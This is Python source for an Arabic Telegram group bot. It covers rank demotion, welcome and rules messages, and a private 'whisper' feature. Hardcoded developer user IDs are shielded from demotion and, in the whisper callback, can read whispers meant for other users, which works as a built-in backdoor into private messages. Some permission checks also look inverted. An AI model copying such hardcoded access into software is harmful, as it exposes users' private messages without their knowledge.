          rank = get_rank(id,cid)
          if not rank == 'عضو' and not id == int(r.get(f'{Dev_Zaid}botowner')) and not id in [6168217372] and not r.get(
                  f'{id}:rankDEV2:{Dev_Zaid}') and not r.get(f'{id}:rankDEV:{Dev_Zaid}'):
              m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
              r.delete(f'{cid}:rankOWNER:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listOWNER:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
              return
          if id in [6168217372, 5117901887] or id == int(r.get(f'{Dev_Zaid}botowner')) or not r.get(
                  f'{id}:rankDEV2:{Dev_Zaid}') or r.get(f'{id}:rankDEV:{Dev_Zaid}'):
              return m.reply(f'{k} رتبته اعلى منك')
          else:
              return m.reply(f'{k} ماله رتبة')
       
       if owner_pls(m.from_user.id, m.chat.id):
          rank = get_rank(id,cid)
          if not rank == 'عضو' and not id == int(r.get(f'{Dev_Zaid}botowner')) and not id in [6168217372] and not r.get(
                  f'{id}:rankDEV2:{Dev_Zaid}') and not r.get(f'{id}:rankDEV:{Dev_Zaid}') and not r.get(
                  f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
              m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
              r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
              return
          if id in [6168217372, 5117901887] or id == int(r.get(f'{Dev_Zaid}botowner')) or not r.get(
                  f'{id}:rankDEV2:{Dev_Zaid}') or r.get(f'{id}:rankDEV:{Dev_Zaid}') or r.get(
                  f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
              return m.reply(f'{k} رتبته اعلى منك')
          else:
              return m.reply(f'{k} ماله رتبة')
       
       if mod_pls(m.from_user.id, m.chat.id):
          rank = get_rank(id,cid)
          if not rank == 'عضو' and not id == int(r.get(f'{Dev_Zaid}botowner')) and not id in [6168217372] and not r.get(
                  f'{id}:rankDEV2:{Dev_Zaid}') and not r.get(f'{id}:rankDEV:{Dev_Zaid}') and not r.get(
                  f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
              m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
              r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
              return
          if id in [6168217372, 5117901887] or id == int(r.get(f'{Dev_Zaid}botowner')) or not r.get(
                  f'{id}:rankDEV2:{Dev_Zaid}') or r.get(f'{id}:rankDEV:{Dev_Zaid}') or r.get(
                  f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
              return m.reply(f'{k} رتبته اعلى منك')
          else:
              return m.reply(f'{k} ماله رتبة')
       
       if admin_pls(m.from_user.id, m.chat.id):
          rank = get_rank(id,cid)
          if not rank == 'عضو' and not id == int(r.get(f'{Dev_Zaid}botowner')) and not id in [6168217372] and not r.get(
                  f'{id}:rankDEV2:{Dev_Zaid}') and not r.get(f'{id}:rankDEV:{Dev_Zaid}') and not r.get(
                  f'{cid}:rankGOWNER:{id}{Dev_Zaid}') and not r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
              m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
              r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
              return
          if id in [6168217372, 5117901887] or id == int(r.get(f'{Dev_Zaid}botowner')) or not r.get(
                  f'{id}:rankDEV2:{Dev_Zaid}') or r.get(f'{id}:rankDEV:{Dev_Zaid}') or r.get(
                  f'{cid}:rankGOWNER:{id}{Dev_Zaid}') or r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
              return m.reply(f'{k} رتبته اعلى منك')
          else:
              return m.reply(f'{k} ماله رتبة')
    
    
    if text == 'تنزيل الكل' and m.reply_to_message and m.reply_to_message.from_user:
       if not owner_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( المالك وفوق ) بس')
       
       id = m.reply_to_message.from_user.id
       mention= m.reply_to_message.from_user.mention
       
       if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
       if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')
       if devp_pls(m.from_user.id,m.chat.id):
          rank = get_rank(id,cid)
          if id == m.from_user.id:
             return m.reply(f'{k} مافيك تنزل نفسك')
          if not rank == 'عضو' and not id in [6168217372]:
              m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
              r.delete(f'{id}:rankDEV2:{Dev_Zaid}')
              r.srem(f'{Dev_Zaid}DEV2', id)
              r.delete(f'{id}:rankDEV:{Dev_Zaid}')
              r.srem(f'{Dev_Zaid}DEV', id)
              r.delete(f'{cid}:rankGOWNER:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listGOWNER:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankOWNER:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listOWNER:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
              return
          if id in [6168217372, 5117901887]:
              return m.reply(f'{k} مايمديك تستخدم الأمر على مبرمج السورس')
          else:
             return m.reply(f'{k} ماله رتبة')
       
       if dev2_pls(m.from_user.id, m.chat.id):
          rank = get_rank(id,cid)
          if not rank == 'عضو' and not id == int(r.get(f'{Dev_Zaid}botowner')) and not id in [6168217372]:
              m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
              r.delete(f'{id}:rankDEV:{Dev_Zaid}')
              r.srem(f'{Dev_Zaid}DEV', id)
              r.delete(f'{cid}:rankGOWNER:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listGOWNER:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankOWNER:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listOWNER:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
              return
          if id in [6168217372, 5117901887] or id == int(r.get(f'{Dev_Zaid}botowner')):
              return m.reply(f'{k} رتبته اعلى منك')
          else:
              return m.reply(f'{k} ماله رتبة')
       
       if dev_pls(m.from_user.id, m.chat.id):
          rank = get_rank(id,cid)
          if not rank == 'عضو' and not id == int(r.get(f'{Dev_Zaid}botowner')) and not id in [6168217372] and not r.get(
                  f'{id}:rankDEV2:{Dev_Zaid}'):
              m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
              r.delete(f'{cid}:rankGOWNER:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listGOWNER:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankOWNER:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listOWNER:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
              return
          if id in [6168217372, 5117901887] or id == int(r.get(f'{Dev_Zaid}botowner')) or not r.get(
                  f'{id}:rankDEV2:{Dev_Zaid}'):
              return m.reply(f'{k} رتبته اعلى منك')
          else:
              return m.reply(f'{k} ماله رتبة')

       if gowner_pls(m.from_user.id, m.chat.id):
           rank = get_rank(id, cid)
           if not rank == 'عضو' and not id == int(r.get(f'{Dev_Zaid}botowner')) and not id in [
               6168217372] and not r.get(f'{id}:rankDEV2:{Dev_Zaid}') and not r.get(f'{id}:rankDEV:{Dev_Zaid}'):
               m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
               r.delete(f'{cid}:rankOWNER:{id}{Dev_Zaid}')
               r.srem(f'{cid}:listOWNER:{Dev_Zaid}', id)
               r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
               r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
               r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
               r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
               r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
               r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
               return
           if id in [6168217372, 5117901887] or id == int(r.get(f'{Dev_Zaid}botowner')) or not r.get(
                   f'{id}:rankDEV2:{Dev_Zaid}') or r.get(f'{id}:rankDEV:{Dev_Zaid}'):
               return m.reply(f'{k} رتبته اعلى منك')
           else:
               return m.reply(f'{k} ماله رتبة')
       
       if owner_pls(m.from_user.id, m.chat.id):
          rank = get_rank(id,cid)
          if not rank == 'عضو' and not id == int(r.get(f'{Dev_Zaid}botowner')) and not id in [6168217372] and not r.get(
                  f'{id}:rankDEV2:{Dev_Zaid}') and not r.get(f'{id}:rankDEV:{Dev_Zaid}') and not r.get(
                  f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
              m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
              r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
              return
          if id in [6168217372, 5117901887] or id == int(r.get(f'{Dev_Zaid}botowner')) or not r.get(
                  f'{id}:rankDEV2:{Dev_Zaid}') or r.get(f'{id}:rankDEV:{Dev_Zaid}') or r.get(
                  f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
              return m.reply(f'{k} رتبته اعلى منك')
          else:
              return m.reply(f'{k} ماله رتبة')

       if mod_pls(m.from_user.id, m.chat.id):
           rank = get_rank(id, cid)
           if not rank == 'عضو' and not id == int(r.get(f'{Dev_Zaid}botowner')) and not id in [
               6168217372] and not r.get(f'{id}:rankDEV2:{Dev_Zaid}') and not r.get(
                   f'{id}:rankDEV:{Dev_Zaid}') and not r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}') and not r.get(
                   f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
               m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
               r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
               r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
               r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
               r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
               return
           if id in [6168217372, 5117901887] or id == int(r.get(f'{Dev_Zaid}botowner')) or not r.get(
                   f'{id}:rankDEV2:{Dev_Zaid}') or r.get(f'{id}:rankDEV:{Dev_Zaid}') or r.get(
                   f'{cid}:rankGOWNER:{id}{Dev_Zaid}') or r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
               return m.reply(f'{k} رتبته اعلى منك')
           else:
               return m.reply(f'{k} ماله رتبة')

       if admin_pls(m.from_user.id, m.chat.id):
           rank = get_rank(id, cid)
           if not rank == 'عضو' and not id == int(r.get(f'{Dev_Zaid}botowner')) and not id in [
               6168217372] and not r.get(f'{id}:rankDEV2:{Dev_Zaid}') and not r.get(
                   f'{id}:rankDEV:{Dev_Zaid}') and not r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}') and not r.get(
                   f'{cid}:rankOWNER:{id}{Dev_Zaid}') and not r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
               m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
               r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
               r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
               return
           if id in [6168217372, 5117901887] or id == int(r.get(f'{Dev_Zaid}botowner')) or r.get(
                   f'{id}:rankDEV2:{Dev_Zaid}') or r.get(f'{id}:rankDEV:{Dev_Zaid}') or r.get(
                   f'{cid}:rankGOWNER:{id}{Dev_Zaid}') or r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}') or r.get(
                   f'{cid}:rankMOD:{id}{Dev_Zaid}'):
               return m.reply(f'{k} رتبته اعلى منك')
           else:
               return m.reply(f'{k} ماله رتبة')
# ==================== FILE: welcome_and_rules.py ====================
"""


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

"""


default_welcome = """لا تُسِئ اللفظ وإن ضَاق عليك الرَّد

ɴᴀᴍᴇ ⌯ {الاسم}
ᴜѕᴇʀɴᴀᴍᴇ ⌯ {اليوزر}
𝖣𝖺𝗍𝖾 ⌯ {التاريخ}"""


@Client.on_message(filters.group & filters.text, group=29)
def setWelcomeHandler(c, m):
    k = r.get(f"{Dev_Zaid}:botkey")
    Thread(target=welcomeFunc, args=(c, m, k)).start()


def welcomeFunc(c, m, k):
    if not r.get(f"{m.chat.id}:enable:{Dev_Zaid}"):
        return
    if r.get(f"{m.chat.id}:mute:{Dev_Zaid}") and not admin_pls(
        m.from_user.id, m.chat.id
    ):
        return
    if r.get(f"{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}"):
        return
    if r.get(f"{m.from_user.id}:mute:{Dev_Zaid}"):
        return
    if r.get(f"{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}"):
        return
    if r.get(f"{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}"):
        return
    if r.get(f"{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}") or r.get(
        f"{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}"
    ):
        return
    text = m.text
    name = r.get(f"{Dev_Zaid}:BotName") if r.get(f"{Dev_Zaid}:BotName") else "رعد"
    if text.startswith(f"{name} "):
        text = text.replace(f"{name} ", "")
    if r.get(f"{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}"):
        text = r.get(f"{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}")
    if r.get(f"Custom:{Dev_Zaid}&text={text}"):
        text = r.get(f"Custom:{Dev_Zaid}&text={text}")
    if isLockCommand(m.from_user.id, m.chat.id, text):
        return
    if text == "الغاء" and r.get(f"{m.chat.id}:setWelcome:{m.from_user.id}{Dev_Zaid}"):
        r.delete(f"{m.chat.id}:setWelcome:{m.from_user.id}{Dev_Zaid}")
        return m.reply(f"{k} ابشر لغيت وضع الترحيب")

    if text == "الغاء" and r.get(f"{m.chat.id}:setRules:{m.from_user.id}{Dev_Zaid}"):
        r.delete(f"{m.chat.id}:setRules:{m.from_user.id}{Dev_Zaid}")
        return m.reply(f"{k} ابشر لغيت وضع القوانين")

    if r.get(f"{m.chat.id}:setRules:{m.from_user.id}{Dev_Zaid}") and mod_pls(
        m.from_user.id, m.chat.id
    ):
        r.set(f"{m.chat.id}:CustomRules:{Dev_Zaid}", m.text.html)
        r.delete(f"{m.chat.id}:setRules:{m.from_user.id}{Dev_Zaid}")
        return m.reply(f"{k} تم حطيتها")

    if r.get(f"{m.chat.id}:setWelcome:{m.from_user.id}{Dev_Zaid}") and mod_pls(
        m.from_user.id, m.chat.id
    ):
        r.set(f"{m.chat.id}:CustomWelcome:{Dev_Zaid}", m.text.html)
        r.delete(f"{m.chat.id}:setWelcome:{m.from_user.id}{Dev_Zaid}")
        return m.reply(f"{k} تم وسوينا الترحيب ياعيني")

    if text == "مسح القوانين":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            r.delete(f"{m.chat.id}:CustomRules:{Dev_Zaid}")
            return m.reply(f"{k} من عيوني مسحت القوانين")

    if text == "وضع قوانين":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            r.set(f"{m.chat.id}:setRules:{m.from_user.id}{Dev_Zaid}", 1)
            return m.reply(f"{k} ارسل القوانين الحين")

    if text == "الترحيب":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:CustomWelcome:{Dev_Zaid}"):
                return m.reply(f"`{default_welcome}`")
            else:
                welcome = r.get(f"{m.chat.id}:CustomWelcome:{Dev_Zaid}")
                return m.reply(f"`{welcome}`")

    if text == "مسح الترحيب":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            r.delete(f"{m.chat.id}:CustomWelcome:{Dev_Zaid}")
            return m.reply(f"{k} مسحت الترحيب")

    if text == "وضع الترحيب" or text == "ضع الترحيب":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            r.set(f"{m.chat.id}:setWelcome:{m.from_user.id}{Dev_Zaid}", 1)
            return m.reply("""⇜ تمام عيني  
⇜ ارسل رسالة الترحيب الحين

⇜ ملاحظة تقدر تضيف دوال للترحيب مثلا :
⇜ اظهار قوانين المجموعه  ⇠ {القوانين}  
⇜ اظهار اسم العضو ⇠ {الاسم}
⇜ اظهار اليوزر العضو ⇠ {اليوزر}
⇜ اظهار اسم المجموعه ⇠ {المجموعه} 
⇜ اظهار تاريخ دخول العضو ⇠ {التاريخ} 
⇜ اظهار وقت دخول العضو ⇠ {الوقت} 
☆
""")


@Client.on_message(filters.new_chat_members, group=4)
def welcomeRespons(c: Client, m: Message):
    if not r.get(f"{m.chat.id}:enable:{Dev_Zaid}"):
        return
    k = r.get(f"{Dev_Zaid}:botkey")
    channel = (
        r.get(f"{Dev_Zaid}:BotChannel") if r.get(f"{Dev_Zaid}:BotChannel") else "eFFb0t"
    )
    print("member")
    if not r.get(f"{m.chat.id}:disableWelcome:{Dev_Zaid}") and m.new_chat_members:
        if not r.get(f"{m.chat.id}:CustomWelcome:{Dev_Zaid}"):
            welcome = default_welcome
        else:
            welcome = r.get(f"{m.chat.id}:CustomWelcome:{Dev_Zaid}")
        for me in m.new_chat_members:
            if not me.id == int(Dev_Zaid):
                if r.get(f"{m.chat.id}:enableVerify:{Dev_Zaid}") and not pre_pls(
                    me.id, m.chat.id
                ):
                    return
                photo = None
                if not r.get(f"{m.chat.id}:disableWelcomep:{Dev_Zaid}") and me.photo:
                    for photo in c.get_chat_photos(me.id, limit=1):
                        photo = photo.file_id
                title = m.chat.title
                name = me.first_name
                if me.username:
                    username = f"@{me.username}"
                else:
                    username = f"@{channel}"
                TIME_ZONE = "Asia/Riyadh"
                ZONE = pytz.timezone(TIME_ZONE)
                TIME = datetime.now(ZONE)
                clock = TIME.strftime("%I:%M %p")
                date = TIME.strftime("%d/%m/%Y")
                if r.get(f"{m.chat.id}:CustomRules:{Dev_Zaid}"):
                    rules = r.get(f"{m.chat.id}:CustomRules:{Dev_Zaid}")
                else:
                    rules = """{k} ممنوع نشر الروابط 
{k} ممنوع التكلم او نشر صور اباحيه 
{k} ممنوع اعاده توجيه 
{k} ممنوع العنصرية بكل انواعها 
{k} الرجاء احترام المدراء والادمنيه"""
                w = (
                    welcome.replace("{القوانين}", rules)
                    .replace("{الاسم}", name)
                    .replace("{المجموعه}", title)
                    .replace("{الوقت}", clock)
                    .replace("{التاريخ}", date)
                    .replace("{اليوزر}", username)
                )
                if not photo:
                    return m.reply(w, disable_web_page_preview=True)
                else:
                    return m.reply_photo(photo, caption=w)


"""
def welcomeRespons(c,m):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   k = r.get(f'{Dev_Zaid}:botkey')
   channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'Y88F8'
   print("member")
   if not r.get(f'{m.chat.id}:disableWelcome:{Dev_Zaid}') and m.new_chat_members:
     if not r.get(f'{m.chat.id}:CustomWelcome:{Dev_Zaid}'):
        welcome = default_welcome
     else:
        welcome = r.get(f'{m.chat.id}:CustomWelcome:{Dev_Zaid}')
     for me in m.new_chat_members:
      if not me.id == int(Dev_Zaid):
        if r.get(f'{m.chat.id}:enableVerify:{Dev_Zaid}') and not pre_pls(me.id,m.chat.id):
          return
        title = m.chat.title
        name = me.first_name
        if me.username:
          username = f'@{me.username}'
        else:
          username = f'@{channel}'
        TIME_ZONE = "Asia/Riyadh"
        ZONE = pytz.timezone(TIME_ZONE)
        TIME = datetime.now(ZONE)
        clock = TIME.strftime("%I:%M %p")
        date = TIME.strftime("%d/%m/%Y")
        if r.get(f'{m.chat.id}:CustomRules:{Dev_Zaid}'):
          rules = r.get(f'{m.chat.id}:CustomRules:{Dev_Zaid}')
        else:
          rules = '''{k} ممنوع نشر الروابط 
{k} ممنوع التكلم او نشر صور اباحيه 
{k} ممنوع اعاده توجيه 
{k} ممنوع العنصرية بكل انواعها 
{k} الرجاء احترام المدراء والادمنيه'''
        w = welcome.replace('{القوانين}',rules).replace('{الاسم}',name).replace('{المجموعه}',title).replace('{الوقت}', clock).replace('{التاريخ}',date).replace('{اليوزر}',username)
        try:
          c.send_message(m.chat.id,w, disable_web_page_preview=True,reply_to_message_id=m.id)
        except:
          c.send_message(m.chat.id,w, disable_web_page_preview=True)
        return True
"""

# ==================== FILE: whisper.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''



def get_id():
   rndm = ''.join([random.choice(string.ascii_letters
            + string.digits) for n in range(7)])
   return rndm

@Client.on_inline_query(filters.regex(" @"))
async def send_whisper(app, iquery):
    if not iquery.from_user.language_code or not iquery.from_user.language_code == 'en':
      await arabic_whisper(app,iquery)
    else:
      await english_whisper(app,iquery)


async def english_whisper(app,iquery):
    user = iquery.query.split("@")[1]
    if " " in user: return 
    user_id = iquery.from_user.id
    query = iquery.query.split("@")[0]
    if user == "all":
      text = "🎊 Surprise for everyone"
      username = "everyone 🎊"
    else:
      get = await app.get_chat(user)
      user = get.id
      username = get.first_name
      user_name = get.username
      text = f"**This whisper is for ( @{user_name} ) he/she can see it 🕵️‍♂️ .**"
    url = 'https://k.top4top.io/p_2727oxo3z0.jpg'
    id = get_id()
    r.set(f'{id}', f'id={user_id}+{user}&whisper={query}',ex=86400)
    reply_markup = InlineKeyboardMarkup(
      [[
        InlineKeyboardButton("📪 Show whisper", callback_data=f"{id}whisper+en")
      ]]
    )
    TIME_ZONE = "Asia/Damascus"
    ZONE = pytz.timezone(TIME_ZONE)
    TIME = datetime.now(ZONE)
    timenow = "❤️‍🔥 - "+TIME.strftime("%I:%M %p")
    await iquery.answer(
      switch_pm_text="• How to use?",
      switch_pm_parameter="Commands",
      results=[
       InlineQueryResultArticle(
          title=f"📪 Send whisper for ( {username} ) .",
          description=timenow,
          url="http://t.me/LLL3P",
          thumb_url=url,
          thumb_width=128, thumb_height=128,
          input_message_content=InputTextMessageContent(
            message_text=text,
            parse_mode=enums.ParseMode.MARKDOWN 
          ),
          reply_markup=reply_markup
       )
      ],
      cache_time=1
    )


async def arabic_whisper(app,iquery):
    user = iquery.query.split("@")[1]
    if " " in user: return 
    user_id = iquery.from_user.id
    query = iquery.query.split("@")[0]
    if user == "all":
      text = "🎊 مفاجأة للجميع"
      username = "الجميع 🎊"
    else:
      get = await app.get_chat(user)
      user = get.id
      username = get.first_name
      user_name = get.username
      text = f"**هذي الهمسة للحلو ( @{user_name} ) هو اللي يقدر يشوفها 🕵️**"
    url = 'https://k.top4top.io/p_2727oxo3z0.jpg'
    id = get_id()
    r.set(f'{id}', f'id={user_id}+{user}&whisper={query}',ex=86400)
    reply_markup = InlineKeyboardMarkup(
      [[
        InlineKeyboardButton("📪 عرض الهمسة", callback_data=f"{id}whisper+ar")
      ]]
    )
    TIME_ZONE = "Asia/Damascus"
    ZONE = pytz.timezone(TIME_ZONE)
    TIME = datetime.now(ZONE)
    timenow = "🇸🇾 - "+TIME.strftime("%I:%M %p")
    await iquery.answer(
      switch_pm_text="• كيف تستخدمني",
      switch_pm_parameter="Commands",
      results=[
       InlineQueryResultArticle(
          title=f"📪 ارسال همسة لـ {username}",
          description=timenow,
          url="http://t.me/LLL3P",
          thumb_url=url,
          thumb_width=128, thumb_height=128,
          input_message_content=InputTextMessageContent(
            message_text=text,
            parse_mode=enums.ParseMode.MARKDOWN 
          ),
          reply_markup=reply_markup
       )
      ],
      cache_time=1
    )

@Client.on_callback_query(filters.regex("whisper"))
async def get_whisper(app,query):
  if query.data.endswith('+ar'):
    id = query.data.split("whisper")[0]
    if r.get(id):
      get = r.get(id)
      id = get.split('id=')[1].split('&')[0]
      if not 'all' in id and not str(query.from_user.id) in id and not query.from_user.id == 7284348194:
        return await query.answer('~ الهمسة مو لك يا حبيبي',show_alert=True, cache_time=600)
    reply_markup = InlineKeyboardMarkup(
      [
      [
        InlineKeyboardButton("📭 عرض الهمسة", callback_data=query.data)
      ]
      ]
    )
    q = get.split('&whisper=')[1]
    if "all" in id:
       return await query.answer(q[:200], show_alert=True, cache_time=600)
    else:
      if str(query.from_user.id) in id.split('+')[0]:
         return await query.answer(q[:200], show_alert=True, cache_time=600)
      if str(query.from_user.id) in id.split('+')[1]:
         await query.answer(q[:200], show_alert=True, cache_time=600)
         try:
           await query.edit_message_reply_markup(reply_markup)
         except:
           pass
      if query.from_user.id == 6168217372 or query.from_user.id ==5117901887:
         return await query.answer(q[:200], show_alert=True, cache_time=600)
  else:
    id = query.data.split("whisper")[0]
    if r.get(id):
      get = r.get(id)
      id = get.split('id=')[1].split('&')[0]
      if not 'all' in id and not str(query.from_user.id) in id and not query.from_user.id == 6168217372:
        return await query.answer('~ This whisper not for you .',show_alert=True, cache_time=600)
    reply_markup = InlineKeyboardMarkup(
      [
      [
        InlineKeyboardButton("📭 Show whisper", callback_data=query.data)
      ]
      ]
    )
    q = get.split('&whisper=')[1]
    if "all" in id:
       return await query.answer(q[:200], show_alert=True, cache_time=600)
    else:
      if str(query.from_user.id) in id.split('+')[0]:
         return await query.answer(q[:200], show_alert=True, cache_time=600)
      if str(query.from_user.id) in id.split('+')[1]:
         await query.answer(q[:200], show_alert=True, cache_time=600)
         try:
           await query.edit_message_reply_markup(reply_markup)
         except:
           pass
      if query.from_user.id == 7284348194 or query.from_user.id ==7284348194:
         return await query.answer(q[:200], show_alert=True, cache_time=600)

'''
@Client.on_callback_query(filters.regex("whisper+en"))
async def get_whisper_en(app,query):
'''
      
@Client.on_inline_query()
async def whisper(c, query):
    text = '''
• `@marilinbot Hi @LLL3P`
'''
    if not query.from_user.language_code or not query.from_user.language_code == 'en':
      await query.answer(
        switch_pm_text="• كيف تستخدمني",
        switch_pm_parameter="Commands",
        results=[           
            InlineQueryResultArticle(
                title="🔒 اكتب الهمسة + يوزر الشخص",
                thumb_url='https://k.top4top.io/p_2727oxo3z0.jpg',
                thumb_width=128, thumb_height=128,
                description='@marilinbot Hello @LLL3P',
                url='https://t.me/LLL3P',
                reply_markup=InlineKeyboardMarkup (
                [
                [InlineKeyboardButton ("جرب بوت الهمسة", switch_inline_query='Hi @all')]
                ]
                ),
                input_message_content=InputTextMessageContent(text, disable_web_page_preview=True)
            ),
        ],
        )
    else:
      await query.answer(
        switch_pm_text="• How to use?",
        switch_pm_parameter="Commands",
        results=[           
            InlineQueryResultArticle(
                title="🔒 Type the whisper + username",
                thumb_url='https://k.top4top.io/p_2727oxo3z0.jpg',
                thumb_width=128, thumb_height=128,
                description='@marilinbot Hello @LLL3P',
                url='https://t.me/LLL3P',
